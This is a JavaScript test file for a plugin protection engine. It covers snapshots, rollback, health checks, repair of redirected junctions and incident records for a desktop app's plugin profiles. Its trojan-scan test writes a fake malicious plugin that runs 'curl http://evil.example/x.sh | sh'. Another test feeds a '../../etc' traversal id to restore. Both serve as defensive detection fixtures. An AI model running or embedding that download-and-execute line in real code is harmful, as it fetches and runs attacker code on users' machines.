// Tests for plugin-guard.js — the fused protection engine
// (snapshots / rollback / static health check / repair / junction guard).
//
// Scenarios mirror the three community plugins this engine fuses:
//   · dsh-plugin-guard: pre-change snapshot, one-click restore, guarded boot
//   · dsh-web-plugin-manager: install-time verification + rollback path
//   · dsh-plugin-healthcheck: static findings (shadow copies, patch rows,
//     junction ownership, trojan patterns) with a repair executor

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createGuard } from '../plugin-guard.js';

/** Build a fake DSH home with an installation closure + desktop profile. */
function makeHome(t) {
  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-'));
  const closure = join(home, 'app-closure');
  const fallback = join(home, 'profiles', 'node_modules');
  const profile = join(home, 'profiles', 'web-desktop');

  const addClosurePkg = (name) => {
    const dir = join(closure, ...name.split('/'));
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name, version: '1.0.0' }));
  };
  addClosurePkg('@deepseek-ai/dsh');
  addClosurePkg('@deepseek-ai/dsh-scope');

  // Fallback junctions pointing into the closure (healthy baseline).
  mkdirSync(join(fallback, '@deepseek-ai'), { recursive: true });
  symlinkSync(join(closure, '@deepseek-ai', 'dsh'), join(fallback, '@deepseek-ai', 'dsh'), 'junction');
  symlinkSync(join(closure, '@deepseek-ai', 'dsh-scope'), join(fallback, '@deepseek-ai', 'dsh-scope'), 'junction');

  // Desktop profile with the four guard files.
  mkdirSync(profile, { recursive: true });
  writeFileSync(join(profile, 'package.json'), JSON.stringify({ name: 'dsh-profile-web-desktop', dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } } }));
  writeFileSync(join(profile, 'cordis.patch.yml'), '[]\n');
  writeFileSync(join(profile, 'pnpm-workspace.yaml'), 'packages:\n  - .\n');

  // The fake dsh bin the guard derives the expected closure root from.
  const bin = join(closure, '@deepseek-ai', 'dsh', 'lib', 'bin.js');
  mkdirSync(join(closure, '@deepseek-ai', 'dsh', 'lib'), { recursive: true });
  writeFileSync(bin, '// fake bin\n');

  const guard = createGuard({
    getHome: () => home,
    getProfile: () => 'web-desktop',
    dshBin: () => bin,
    log: () => {},
  });
  t?.after(() => rmSync(home, { recursive: true, force: true }));
  return { home, closure, fallback, profile, guard, bin };
}

test('snapshot captures the four config files and lists itself', () => {
  const t0 = { after: (fn) => fn };
  const { profile, guard } = makeHome(t0);
  const snap = guard.snapshot('boot');
  assert.ok(snap, 'snapshot must be created');
  assert.deepEqual(snap.files.slice().sort(), ['cordis.patch.yml', 'package.json', 'pnpm-workspace.yaml'].sort());
  const list = guard.listSnapshots();
  assert.equal(list.length, 1);
  assert.equal(list[0].reason, 'boot');
  rmSync(profile, { recursive: true, force: true });
});

test('restore puts a broken profile back to the snapshotted state', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  const snap = guard.snapshot('boot');
  // 用户（或坏插件）把 patch 层改坏、package.json 删掉。
  writeFileSync(join(profile, 'cordis.patch.yml'), '- insert:\n    - id: evil\n      name: \'evil-pkg\'\n');
  rmSync(join(profile, 'package.json'));
  const res = guard.restore(snap.id);
  assert.equal(res.ok, true);
  assert.equal(readFileSync(join(profile, 'cordis.patch.yml'), 'utf8'), '[]\n');
  assert.ok(existsSync(join(profile, 'package.json')));
  rmSync(home, { recursive: true, force: true });
});

test('restore refuses unknown snapshot ids', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  assert.equal(guard.restore('../../etc').ok, false);
  assert.equal(guard.restore('nope').ok, false);
  rmSync(home, { recursive: true, force: true });
});

test('healthCheck flags shadow copies of closure packages', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  const nm = join(profile, 'node_modules', '@deepseek-ai', 'dsh-scope');
  mkdirSync(join(nm, 'lib'), { recursive: true });
  writeFileSync(join(nm, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh-scope' }));
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code === 'SHADOW_COPY' && f.fixable), 'shadow copy must be flagged fixable');
  rmSync(home, { recursive: true, force: true });
});

test('healthCheck flags duplicate patch row ids and missing soul-md config', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: soul-md\n      name: \'dsh-soul-md\'\n' +
    '- insert:\n    - id: soul-md\n      name: \'dsh-soul-md\'\n');
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code === 'PATCH_DUP_ID'), 'duplicate row id must be flagged');
  assert.ok(findings.some((f) => f.code === 'PATCH_SOUL_CONFIG'), 'soul-md row without config must be flagged');
  rmSync(home, { recursive: true, force: true });
});

test('healthCheck flags junctions re-pointed outside the desktop closure', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  // 原生 CLI 的闭包目录（junction 被改指到这里 —— 即原生冲突形态）。
  const foreign = join(home, 'npx-cache', '@deepseek-ai', 'dsh');
  mkdirSync(foreign, { recursive: true });
  writeFileSync(join(foreign, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh' }));
  const fallback = join(home, 'profiles', 'node_modules', '@deepseek-ai', 'dsh');
  rmSync(fallback, { recursive: true, force: true }); // junction 需 recursive 才能摘除
  symlinkSync(foreign, fallback, 'junction');
  const findings = guard.junctionFindings();
  assert.ok(findings.some((f) => f.code === 'JUNCTION_FOREIGN'), 'foreign junction must be flagged');
  rmSync(home, { recursive: true, force: true });
});

test('repairJunctions re-points foreign junctions back to the closure', () => {
  const t0 = { after: (fn) => fn };
  const { home, closure, guard } = makeHome(t0);
  const foreign = join(home, 'npx-cache', '@deepseek-ai', 'dsh');
  mkdirSync(foreign, { recursive: true });
  writeFileSync(join(foreign, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh' }));
  const fallback = join(home, 'profiles', 'node_modules', '@deepseek-ai', 'dsh');
  rmSync(fallback, { recursive: true, force: true }); // junction 需 recursive 才能摘除
  symlinkSync(foreign, fallback, 'junction');
  const res = guard.repairJunctions();
  assert.ok(res.repaired.includes('@deepseek-ai/dsh'), 'junction must be repaired, got: ' + JSON.stringify(res));
  const real = (() => { try { return readFileSync(join(fallback, 'package.json'), 'utf8'); } catch { return ''; } })();
  assert.ok(real.includes('dsh') || real.length > 0, 're-pointed junction must resolve into the closure');
  rmSync(home, { recursive: true, force: true });
});

test('trojan scan flags download-and-exec patterns without executing them', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  const evil = join(profile, 'node_modules', 'dsh-evil-plugin');
  mkdirSync(join(evil, 'lib'), { recursive: true });
  writeFileSync(join(evil, 'package.json'), JSON.stringify({ name: 'dsh-evil-plugin' }));
  writeFileSync(join(evil, 'lib', 'index.js'),
    'const { exec } = require("child_process"); exec("curl http://evil.example/x.sh | sh");\n');
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code.startsWith('TROJAN_')), 'trojan pattern must be flagged, got: ' + JSON.stringify(findings));
  // 高危扫描只报告，不自动删除。
  assert.ok(findings.filter((f) => f.code.startsWith('TROJAN_')).every((f) => !f.fixable));
  rmSync(home, { recursive: true, force: true });
});

test('guardedBoot repairs and retries when the first boot fails', async () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  // 修复可用的故障：遮蔽拷贝导致首启失败。
  const nm = join(profile, 'node_modules', '@deepseek-ai');
  mkdirSync(join(nm, 'dsh-scope'), { recursive: true });
  writeFileSync(join(nm, 'dsh-scope', 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh-scope' }));

  let attempts = 0;
  const startOnce = async () => {
    attempts += 1;
    const broken = existsSync(join(nm, 'dsh-scope', 'package.json'));
    if (broken) throw new Error('dsh web 启动失败（退出码 1）');
    return 'http://127.0.0.1:1';
  };
  mkdirSync(join(nm, 'dsh-scope'), { recursive: true });
  writeFileSync(join(nm, 'dsh-scope', 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh-scope' }));
  const url = await guard.guardedBoot(startOnce, () => '');
  assert.equal(url, 'http://127.0.0.1:1');
  assert.equal(attempts, 2, 'must boot exactly twice (fail + repaired retry)');
  assert.ok(guard.lastGoodSnapshot(), 'success must mark the boot snapshot as good');
  rmSync(home, { recursive: true, force: true });
});

test('guardedBoot rolls back to the last good snapshot when repair is not enough', async () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  // 先制造一个「最后良好」快照（当前健康状态）。
  writeFileSync(join(profile, 'cordis.patch.yml'), '[]\n');
  const good = guard.snapshot('boot');
  guard.markGood(good.id);
  // 然后把 patch 层写坏 —— 修复器无法自动修（无 bundle 去重目标），
  // 回滚路径应恢复到快照并重试成功。
  writeFileSync(join(profile, 'cordis.patch.yml'), '!!! not yaml at all: [\n');
  let attempts = 0;
  let lifts = 0;
  const startOnce = async () => {
    attempts += 1;
    const bad = !readFileSync(join(profile, 'cordis.patch.yml'), 'utf8').startsWith('[]');
    if (bad) throw new Error('dsh web 启动失败（退出码 1）');
    return 'http://127.0.0.1:2';
  };
  guard.setRollbackLift(async () => { lifts += 1; return 'http://127.0.0.1:2'; });
  const url = await guard.guardedBoot(startOnce, () => '');
  assert.equal(url, 'http://127.0.0.1:2');
  assert.equal(attempts, 1, 'direct boot only runs once');
  assert.equal(lifts, 1, 'rollback retry must go through the lift');
  assert.equal(readFileSync(join(profile, 'cordis.patch.yml'), 'utf8'), '[]\n', 'patch must be rolled back');
  rmSync(home, { recursive: true, force: true });
});

test('guardedBoot files an incident when nothing works', async () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  guard.setRollbackLift(async () => { throw new Error('still broken'); });
  await assert.rejects(() => guard.guardedBoot(async () => { throw new Error('dsh web 启动失败（退出码 1）'); }, () => ''), /退出码 1/);
  assert.equal(guard.listIncidents().length, 1, 'an incident report must be filed');
  rmSync(home, { recursive: true, force: true });
});

test('incident lifecycle: read + resolve', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  const r = guard.reportIncident('boot-failed', 'detail line');
  assert.equal(r.ok, true);
  const list = guard.listIncidents();
  assert.equal(list.length, 1);
  const read = guard.readIncident(list[0].id);
  assert.equal(read.ok, true);
  assert.ok(read.content.includes('detail line'));
  assert.equal(guard.resolveIncident(list[0].id).ok, true);
  assert.equal(guard.listIncidents().length, 0, 'resolved incidents leave the open list');
  rmSync(home, { recursive: true, force: true });
});

test('snapshot pruning keeps at most 10', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  for (let i = 0; i < 14; i += 1) guard.snapshot('bulk-' + i);
  assert.equal(guard.listSnapshots().length, 10);
  rmSync(home, { recursive: true, force: true });
});

test('repair removes duplicate patch rows that conflict with bundle entry ids (issue #172)', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);

  // 模拟市场安装的 bundle 插件：在 node_modules 中有自己的 cordis.patch.yml
  const bundleDir = join(profile, 'node_modules', 'ui-skin-whale-song');
  mkdirSync(join(bundleDir, 'lib'), { recursive: true });
  writeFileSync(join(bundleDir, 'package.json'), JSON.stringify({
    name: 'ui-skin-whale-song',
    version: '1.0.0',
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  }));
  writeFileSync(join(bundleDir, 'cordis.patch.yml'),
    '- insert:\n    - id: ui-skin-whale-song\n      name: \'ui-skin-whale-song\'\n');

  // 模拟 overlay 重复写入：bundle 的 entry id 和 overlay 的重复
  writeFileSync(join(profile, 'package.json'), JSON.stringify({
    name: 'dsh-profile-web-desktop',
    dsh: { profile: { bundles: ['ui-skin-whale-song'] } },
  }));
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: ui-skin-whale-song\n      name: \'ui-skin-whale-song\'\n' +
    '- insert:\n    - id: ui-skin-whale-song\n      name: \'ui-skin-whale-song\'\n');

  // healthCheck 应检测到重复
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code === 'PATCH_DUP_ID'), 'duplicate row id must be flagged');

  // repair 应自动修复（移除 overlay 中与 bundle 重复的行）
  const result = guard.repair(findings);
  assert.ok(result.applied.some((msg) => msg.includes('移除与 bundle 重复的 patch 行')),
    'repair must remove duplicate rows, got: ' + JSON.stringify(result.applied));

  // 修复后不应再有重复
  const patchAfter = readFileSync(join(profile, 'cordis.patch.yml'), 'utf8');
  const ids = [];
  const re = /^\s*-\s*id:\s*([\w.-]+)\s*$/gm;
  let m;
  while ((m = re.exec(patchAfter)) !== null) ids.push(m[1]);
  const dups = ids.filter((id, i) => ids.indexOf(id) !== i);
  assert.equal(dups.length, 0, 'no duplicate ids should remain after repair, found: ' + JSON.stringify(dups));

  rmSync(home, { recursive: true, force: true });
});
